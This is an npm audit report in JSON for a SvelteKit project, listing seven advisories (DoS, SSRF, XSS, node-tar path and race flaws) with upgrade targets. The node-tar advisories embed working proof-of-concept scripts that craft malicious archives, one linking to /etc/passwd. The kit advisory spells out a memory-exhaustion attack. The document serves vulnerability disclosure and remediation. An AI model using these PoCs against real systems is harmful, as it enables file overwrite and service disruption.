{
  "actions": [
    {
      "action": "update",
      "resolves": [
        {
          "id": 1112183,
          "path": ".>@sveltejs/kit>devalue",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1112188,
          "path": ".>@sveltejs/kit>devalue",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "devalue",
      "target": "5.6.2",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1112255,
          "path": ".>@sveltejs/adapter-vercel>@vercel/nft>@mapbox/node-pre-gyp>tar",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1112329,
          "path": ".>@sveltejs/adapter-vercel>@vercel/nft>@mapbox/node-pre-gyp>tar",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "tar",
      "target": "7.5.7",
      "depth": 5
    },
    {
      "action": "review",
      "module": "@sveltejs/kit",
      "resolves": [
        {
          "id": 1112187,
          "path": ".>@sveltejs/kit",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1112190,
          "path": ".>@sveltejs/kit",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "svelte",
      "resolves": [
        {
          "id": 1112297,
          "path": ".>svelte",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    }
  ],
  "advisories": {
    "1112183": {
      "findings": [
        {
          "version": "5.6.1",
          "paths": [
            ".>@sveltejs/kit>devalue"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/sveltejs/devalue/security/advisories/GHSA-g2pg-6438-jwpf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22775\n- https://github.com/sveltejs/devalue/commit/11755849fa0634ae294a15ec0aef2f43efcad7c4\n- https://github.com/sveltejs/devalue/releases/tag/v5.6.2\n- https://github.com/advisories/GHSA-g2pg-6438-jwpf",
      "created": "2026-01-15T22:15:18.000Z",
      "id": 1112183,
      "npm_advisory_id": null,
      "overview": "## Summary\n\nCertain inputs can cause `devalue.parse` to consume excessive CPU time and/or memory, potentially leading to denial of service in systems that parse input from untrusted sources. This affects applications using `devalue.parse` on externally-supplied data. The root cause is the `ArrayBuffer` hydration expecting base64 encoded strings as input, but not checking the assumption before decoding the input.\n\n## Details\n\nThe parser's `ArrayBuffer` hydration logic does not properly validate input before processing. Specially crafted inputs can cause disproportionate memory allocation or CPU usage on the receiving system.\n\n## Impact\n\nThis is a denial of service vulnerability affecting systems that use `devalue.parse` to handle data from potentially untrusted sources.\n\nAffected systems should upgrade to patched versions immediately.",
      "reported_by": null,
      "title": "devalue vulnerable to denial of service due to memory/CPU exhaustion in devalue.parse",
      "metadata": null,
      "cves": [
        "CVE-2026-22775"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "devalue",
      "vulnerable_versions": ">=5.1.0 <5.6.2",
      "github_advisory_id": "GHSA-g2pg-6438-jwpf",
      "recommendation": "Upgrade to version 5.6.2 or later",
      "patched_versions": ">=5.6.2",
      "updated": "2026-01-15T22:15:22.000Z",
      "cvss": {
        "score": 7.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-405"
      ],
      "url": "https://github.com/advisories/GHSA-g2pg-6438-jwpf"
    },
    "1112187": {
      "findings": [
        {
          "version": "2.49.2",
          "paths": [
            ".>@sveltejs/kit"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/sveltejs/kit/security/advisories/GHSA-j2f3-wq62-6q46\n- https://github.com/sveltejs/kit/commit/8ed8155215b9a74012fecffb942ad9a793b274e5\n- https://github.com/sveltejs/kit/releases/tag/%40sveltejs%2Fkit%402.49.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22803\n- https://github.com/sveltejs/kit/releases/tag/@sveltejs%2Fadapter-node@5.5.1\n- https://github.com/advisories/GHSA-j2f3-wq62-6q46",
      "created": "2026-01-15T18:10:52.000Z",
      "id": 1112187,
      "npm_advisory_id": null,
      "overview": "## Summary\n\nThe experimental `form` remote function uses a binary data format containing a representation of submitted form data. A specially-crafted payload can cause the server to allocate a large amount of memory, causing DoS via memory exhaustion.\n\n## Details\n\nWhen a form is submitted to a remote function endpoint, the SvelteKit client encodes the data using a custom format, and POSTs it to the endpoint as a request with an `application/x-sveltekit-formdata` content type.\n\nThe first few bytes of the request body encode the length of the data. SvelteKit will attempt to read the request body up until the specified offset, but if the body is not yet available then an array buffer of that size will be created eagerly to accommodate it as it arrives.\n\nAn attacker can force this code path by sending a small payload that specifies a large data length, then stalling the connection. The resulting array buffer will be held in memory, potentially causing memory exhaustion.\n\n## Impact\n\n- Vulnerability type: Availability / memory exhaustion (memory amplification).\n- Who is impacted: SvelteKit apps with `experimental.remoteFunctions` enabled, and that expose a reachable Remote Form endpoint.\n- Attack: an unauthenticated attacker can repeatedly open connections, send only the 8-byte header/prefix (with large data_length), and stall the body to hold large allocations, exhausting memory.",
      "reported_by": null,
      "title": "@sveltejs/kit has memory amplification DoS vulnerability in Remote Functions binary form deserializer (application/x-sveltekit-formdata)",
      "metadata": null,
      "cves": [
        "CVE-2026-22803"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "@sveltejs/kit",
      "vulnerable_versions": ">=2.49.0 <=2.49.4",
      "github_advisory_id": "GHSA-j2f3-wq62-6q46",
      "recommendation": "Upgrade to version 2.49.5 or later",
      "patched_versions": ">=2.49.5",
      "updated": "2026-01-15T22:33:45.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-789"
      ],
      "url": "https://github.com/advisories/GHSA-j2f3-wq62-6q46"
    },
    "1112188": {
      "findings": [
        {
          "version": "5.6.1",
          "paths": [
            ".>@sveltejs/kit>devalue"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/sveltejs/devalue/security/advisories/GHSA-vw5p-8cq8-m7mv\n- https://github.com/sveltejs/devalue/commit/11755849fa0634ae294a15ec0aef2f43efcad7c4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22774\n- https://github.com/sveltejs/devalue/commit/e46afa64dd2b25aa35fb905ba5d20cea63aabbf7\n- https://github.com/sveltejs/devalue/releases/tag/v5.6.2\n- https://github.com/advisories/GHSA-vw5p-8cq8-m7mv",
      "created": "2026-01-15T18:10:15.000Z",
      "id": 1112188,
      "npm_advisory_id": null,
      "overview": "## Summary\n\nCertain inputs can cause `devalue.parse` to consume excessive CPU time and/or memory, potentially leading to denial of service in systems that parse input from untrusted sources. This affects applications using `devalue.parse` on externally-supplied data. The root cause is the typed array hydration expecting an `ArrayBuffer` as input, but not checking the assumption before creating the typed array.\n\n## Details\n\nThe parser's typed array hydration logic does not properly validate input before processing. Specially crafted inputs can cause disproportionate memory allocation or CPU usage on the receiving system.\n\n## Impact\n\nThis is a denial of service vulnerability affecting systems that use `devalue.parse` to handle data from potentially untrusted sources.\n\nAffected systems should upgrade to patched versions immediately.",
      "reported_by": null,
      "title": "Devalue is vulnerable to denial of service due to memory exhaustion in devalue.parse",
      "metadata": null,
      "cves": [
        "CVE-2026-22774"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "devalue",
      "vulnerable_versions": ">=5.3.0 <=5.6.1",
      "github_advisory_id": "GHSA-vw5p-8cq8-m7mv",
      "recommendation": "Upgrade to version 5.6.2 or later",
      "patched_versions": ">=5.6.2",
      "updated": "2026-01-15T22:33:39.000Z",
      "cvss": {
        "score": 7.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-20",
        "CWE-405"
      ],
      "url": "https://github.com/advisories/GHSA-vw5p-8cq8-m7mv"
    },
    "1112190": {
      "findings": [
        {
          "version": "2.49.2",
          "paths": [
            ".>@sveltejs/kit"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/sveltejs/kit/security/advisories/GHSA-j62c-4x62-9r35\n- https://github.com/sveltejs/kit/commit/d9ae9b00b14f5574d109f3fd548f960594346226\n- https://github.com/sveltejs/kit/releases/tag/%40sveltejs%2Fadapter-node%405.5.1\n- https://github.com/sveltejs/kit/releases/tag/%40sveltejs%2Fkit%402.49.5\n- https://nvd.nist.gov/vuln/detail/CVE-2025-67647\n- https://github.com/advisories/GHSA-j62c-4x62-9r35",
      "created": "2026-01-15T18:09:59.000Z",
      "id": 1112190,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nVersions of SvelteKit are vulnerable to a server side request forgery (SSRF) and denial of service (DoS) under certain conditions.\n\n### Details\n\nAffected versions from 2.44.0 onwards are vulnerable to DoS if:\n\n- your app has at least one prerendered route (`export const prerender = true`)\n\nAffected versions from 2.19.0 onwards are vulnerable to DoS and SSRF if:\n\n- your app has at least one prerendered route (`export const prerender = true`)\n- AND you are using `adapter-node` without a configured `ORIGIN` environment variable, and you are not using a reverse proxy that implements Host header validation\n\n### Impact\n\nThe DoS causes the running server process to end.\n\nThe SSRF allows access to internal services that can be reached without authentication when fetched from SvelteKit's server runtime.\n\nIt is also possible to obtain an SXSS via cache poisoning, by forcing a potential CDN to cache an XSS returned by the attacker's server (the latter being able to specify the cache-control of their choice).\n\n### Credits\n- Allam Rachid ([zhero;](https://zhero-web-sec.github.io/research-and-things/))\n- Allam Yasser (inzo)\n- d-xuan ([wednesday](https://d-xuan.github.io/wednesday/))",
      "reported_by": null,
      "title": "SvelteKit is vulnerable to denial of service and possible SSRF when using prerendering",
      "metadata": null,
      "cves": [
        "CVE-2025-67647"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "@sveltejs/kit",
      "vulnerable_versions": ">=2.19.0 <=2.49.4",
      "github_advisory_id": "GHSA-j62c-4x62-9r35",
      "recommendation": "Upgrade to version 2.49.5 or later",
      "patched_versions": ">=2.49.5",
      "updated": "2026-01-15T22:33:33.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-248",
        "CWE-400",
        "CWE-918"
      ],
      "url": "https://github.com/advisories/GHSA-j62c-4x62-9r35"
    },
    "1112255": {
      "findings": [
        {
          "version": "7.5.2",
          "paths": [
            ".>@sveltejs/adapter-vercel>@vercel/nft>@mapbox/node-pre-gyp>tar"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97\n- https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e\n- https://github.com/advisories/GHSA-8qq5-rm4j-mr97",
      "created": "2026-01-16T21:16:20.000Z",
      "id": 1112255,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
      "reported_by": null,
      "title": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
      "metadata": null,
      "cves": [
        "CVE-2026-23745"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "tar",
      "vulnerable_versions": "<=7.5.2",
      "github_advisory_id": "GHSA-8qq5-rm4j-mr97",
      "recommendation": "Upgrade to version 7.5.3 or later",
      "patched_versions": ">=7.5.3",
      "updated": "2026-01-16T21:16:24.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-22"
      ],
      "url": "https://github.com/advisories/GHSA-8qq5-rm4j-mr97"
    },
    "1112297": {
      "findings": [
        {
          "version": "5.46.0",
          "paths": [
            ".>svelte"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/sveltejs/svelte/security/advisories/GHSA-6738-r8g5-qwp3\n- https://github.com/sveltejs/svelte/commit/ef81048e238844b729942441541d6dcfe6c8ccca\n- https://github.com/sveltejs/svelte/releases/tag/svelte%405.46.4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-15265\n- https://fluidattacks.com/advisories/lydian\n- https://github.com/advisories/GHSA-6738-r8g5-qwp3",
      "created": "2026-01-15T20:13:33.000Z",
      "id": 1112297,
      "npm_advisory_id": null,
      "overview": "## Summary\n\nAn XSS vulnerability exists in Svelte 5.46.0-2 resulting from improper escaping of `hydratable` keys. If these keys incorporate untrusted user input, arbitrary JavaScript can be injected into server-rendered HTML.\n\n## Details\n\nWhen using the [`hydratable`](https://svelte.dev/docs/svelte/hydratable) function, the first argument is used as a key to uniquely identify the data, such that the value is not regenerated in the browser.\n\nThis key is embedded into a `<script>` block in the server-rendered `<head>` without escaping unsafe characters. A malicious key can break out of the script context and inject arbitrary JavaScript into the HTML response.\n\n## Impact\n\nThis is a cross-site scripting vulnerability affecting applications that have the `experimental.async` flag enabled and use `hydratable` with keys incorporating untrusted user input. \n\n- **Impact**: Arbitrary JS execution in the client’s browser.\n- **Exploitability**: Remote, single-request if key is attacker-controlled.\n- **Typical Outcomes**:\n  - Session/token theft\n  - DOM defacement\n  - CSRF bypass via injected JS\n  - Account takeover depending on cookie/session strategy\n\nAffected applications should upgrade to a patched version immediately.",
      "reported_by": null,
      "title": "svelte vulnerable to Cross-site Scripting",
      "metadata": null,
      "cves": [
        "CVE-2025-15265"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "svelte",
      "vulnerable_versions": ">=5.46.0 <=5.46.3",
      "github_advisory_id": "GHSA-6738-r8g5-qwp3",
      "recommendation": "Upgrade to version 5.46.4 or later",
      "patched_versions": ">=5.46.4",
      "updated": "2026-01-19T21:50:24.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-79"
      ],
      "url": "https://github.com/advisories/GHSA-6738-r8g5-qwp3"
    },
    "1112329": {
      "findings": [
        {
          "version": "7.5.2",
          "paths": [
            ".>@sveltejs/adapter-vercel>@vercel/nft>@mapbox/node-pre-gyp>tar"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23950\n- https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6\n- https://github.com/advisories/GHSA-r6q2-hw4h-h46w",
      "created": "2026-01-21T01:05:49.000Z",
      "id": 1112329,
      "npm_advisory_id": null,
      "overview": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---",
      "reported_by": null,
      "title": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
      "metadata": null,
      "cves": [
        "CVE-2026-23950"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "tar",
      "vulnerable_versions": "<=7.5.3",
      "github_advisory_id": "GHSA-r6q2-hw4h-h46w",
      "recommendation": "Upgrade to version 7.5.4 or later",
      "patched_versions": ">=7.5.4",
      "updated": "2026-01-21T01:05:50.000Z",
      "cvss": {
        "score": 8.8,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L"
      },
      "cwe": [
        "CWE-176"
      ],
      "url": "https://github.com/advisories/GHSA-r6q2-hw4h-h46w"
    }
  },
  "muted": [],
  "metadata": {
    "vulnerabilities": {
      "info": 0,
      "low": 0,
      "moderate": 1,
      "high": 6,
      "critical": 0
    },
    "dependencies": 311,
    "devDependencies": 0,
    "optionalDependencies": 0,
    "totalDependencies": 311
  }
}
